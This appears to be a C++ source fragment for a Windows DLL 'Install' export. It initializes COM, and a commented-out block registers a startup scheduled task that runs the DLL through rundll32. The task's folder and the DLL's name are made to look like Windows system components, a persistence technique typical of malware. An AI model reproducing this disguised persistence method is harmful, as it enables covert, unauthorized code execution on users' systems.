//#include <string>
#include "definition.h"

#define FILE_NAME L"libdll32.dll"

EXPORT(Install) {
	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeEx");
		return;
	}

	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeSecurity");
		goto uninitializeExit;
	}

	//HI_InitializeComAPI();
	/*ITaskService* service = HI_CreateTaskService();
	ITaskFolder* folder = HI_CreateFolder(service, L"Microsoft\\Windows\\Registry");
	ITaskDefinition* definition = HI_NewTask(service, folder);
	HI_SetPrincipal(folder, definition);
	HI_SetTriggers(folder, definition);
	std::wstring programArgument(FILE_NAME);
	programArgument += L",Execute";
	wchar_t* rundll32 = HU_GetSystemDirectory(L"rundll32.exe");
	HI_SetActions(folder, definition, rundll32, programArgument.c_str());
	HI_SetSettings(folder, definition);
	HI_RegisterTask(folder, definition, L"Startup");
	definition->Release();
	folder->Release();*/
uninitializeExit:
	CoUninitialize();
}
